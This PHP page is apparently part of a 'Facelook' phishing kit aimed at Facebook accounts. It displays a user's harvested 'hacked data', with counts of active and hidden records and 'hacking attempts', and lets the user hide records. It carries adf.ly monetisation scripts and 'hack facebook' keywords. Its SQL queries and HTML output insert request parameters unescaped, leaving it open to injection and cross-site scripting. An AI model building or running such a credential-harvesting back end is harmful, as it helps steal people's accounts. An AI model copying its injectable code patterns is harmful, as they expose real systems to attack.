<?php 
include"importante/conexion.php";
$usuario = $_REQUEST['us'];

$proceso = $_POST['proceso'];
if($proceso=="Ocultar"){
	$actualizarUsuarios="UPDATE usuarios SET estado='D' WHERE usuario='$usuario'";
		$resultadoActualizar = mysql_query($actualizarUsuarios);
		$cerrar = "<script languaje='javascript' type='text/javascript'>window.close();</script>";
}




?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Facelook: Datos de <?php echo $usuario;?> </title>
<link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
		<link rel="icon" href="img/favicon.ico" type="image/x-icon">
        <meta name="keywords" content="hack facebook, facebook, hacker, red social, hacker cuenta, como hacjer, hack face, Flash, Flash CS5, Dreamweaver, Dreamweaver CS5, Fireworks, Fireworks CS5, Illustrator, php, tiendas en linea, actionscript 3, Action Script, juegos, juegos on line, cursos flash CS5, cursos adobe, adobe flash, adobe dreamweaver, adobe illustrator, adobe fireworks, flash builder, flex 4, programacion, orientado, objetos, maquetacion, css, hojas de estilo, SEO, posicionamiento, redes sociales, facebook, youtube, twitter, html5, css3, animacion 2d, efectos web, cursos empresas lima, intructor web, curso virtual, curso on line">
        
        <script type="text/javascript">
var adfly_id = 5377189;
var adfly_advert = 'int';
var adfly_protocol = 'http';
var adfly_domain = 'adf.ly';
var frequency_cap = '5';
var frequency_delay = '5';
var init_delay = '3';
</script>
<script src="https://cdn.adf.ly/js/entry.js"></script>
</head>
<style>
body{
	background:#EDEDED;
	margin:0 auto;
}
.ocultarDatos{
	margin-left:200px;
	color:#F8F8F8;
	font-weight:bold;
}
#menu{
	margin:0;
	padding:0;
}
#menu li{
	float:left;
	list-style:none;
	padding:6px 6px;
	background:#D45356;
	border-left:1px solid #000000;
}
#menu li a{
	text-decoration:none;
	color:#000000;
}
#menu li:hover{
	background:#C00003;
}
header, nav, section, article, aside, figure, footer{
	display: block;
	margin:0;
	padding:0;
}
a img{
	border:none;
}
.limpiar{
	clear:both;
}
#contenedor{
	margin:0 auto;
	width:850px;
}
.letratab{
	text-align:center;
	line-height:30px;
	font-size:18px;
	color:#0900EF;
	font-family:Gotham, "Helvetica Neue", Helvetica, Arial, sans-serif;
}
.textonum{
	font-family:Helvetica, Arial, sans-serif;
	font-size:12px;
	color:#333;
	text-decoration:none;
	padding: 3px 5px;
	border:1px solid #B7B7B7;
	
}
.num{
	font-family:Helvetica, Arial, sans-serif;
	font-size:12px;
	color:#333;
	padding: 3px 5px;
}

</style>
 <script>
function ValidarOcultar(){
	document.ocultar.action = "datos-hackeado.php?zt=gohjtT_thk_398_gjri8_586_jfir&result=q_busca_mlfJFIjasdflr&shok=3456_459jkfgleot_ldfjJJKJSK&us=<?php echo $usuario;?>";
	document.ocultar.proceso.value = "Ocultar";
	document.ocultar.submit();
	}
    </script>
    <?php echo $cerrar;?>
<body>
<div id="contenedor">
<!-- Start of adf.ly banner code -->
<div style="width: 468px; text-align: center; font-family: verdana; font-size: 10px;"><a href="http://adf.ly/?id=5377189"><img border="0" src="http://cdn.adf.ly/images/banners/adfly.468x60.4.gif" width="468" height="60" title="AdF.ly - acorta links y gana dinero!" /></a><br /><a href="http://adf.ly/?id=5377189">Gana dinero por compartir tus enlaces!</a></div>
<h1>Historial de <?php echo $usuario;?></h1>
<ul id="menu">
	<li><a href="datos-hackeado.php?zt=gohjtT_thk_398_gjri8_586_jfir&result=q_busca_mlfJFIjasdflr&shok=3456_459jkfgleot_ldfjJJKJSK&us=<?php echo $usuario;?>">Datos</a></li>
    <li><a href="datos-hackeado-estadistiva.php?zt=estPro_thk_398_gjri8_586_jfir&result=q_busca_EstAdistRicaProbabilidadjasdflr&shok=3456_459jkfgleot_ldfjJJKJSK&us=<?php echo $usuario;?>">Estadísticas</a></li>
    <li class="ocultarDatos" ><form name="ocultar" method="post" action=""><input type="button" value="Ocultar Datos" name="buscar" onClick="javascript:ValidarOcultar();" title="¿Deseas ocultar para siempre estos datos del usuario <?php echo $usuario;?>?"><input type="hidden" name="proceso"></form></li>
</ul>
<div class="limpiar"></div>
<div style="width:800px; background:#FFFFFF; border:#000000; min-height:60px;" >
	<?php 
	$buscarPro="SELECT * FROM usuarios WHERE (usuario= '$usuario' AND estado='A')";
				$resultadoBuscar = mysql_query($buscarPro);				
				$numregU= mysql_num_rows($resultadoBuscar);
				
	$buscarProD="SELECT * FROM usuarios WHERE (usuario= '$usuario' AND estado='D')";
				$resultadoBuscarD = mysql_query($buscarProD);				
				$numregUD= mysql_num_rows($resultadoBuscarD);
	$total= $numregU + $numregUD;
	$porA = ($numregU * 100)/$total;
	$porD = ($numregUD * 100)/$total;
	?>
    <br>
  <ul>
  	<li><a style="font-size:24px;"><strong>Datos Activos:</strong> <?php echo $numregU; ?></a>
    <a style="font-size:19px;">  (Porcentaje  = <?php echo $porA; ?>%)</a>
    </li>
    <li><a style="font-size:24px;"><strong>Datos Ocultos:</strong> <?php echo $numregUD; ?>
    <a style="font-size:19px;">  (Porcentaje  = <?php echo $porD; ?>%)</a>
    </a>
    
    </li>
    <li><a style="font-size:24px;"><strong>Intentos de hackeo:</strong> <?php echo $total; ?></a>
    
    </li>
    <br>
    <br>
    <a style="font-size:15px; font-weight:bold; color:#771517; margin-bottom:15px; display:block;" href="informacion-usuario-desactivado.php" target="_blank">Más información de DATOS OCULTOS</a>
      <?php
	mysql_free_result($resultadoBuscarD);
				mysql_free_result($resultadoBuscar);
	?>
  </ul>
</div>
</div>

<div id="publicidad">
</div>
</body>
</html>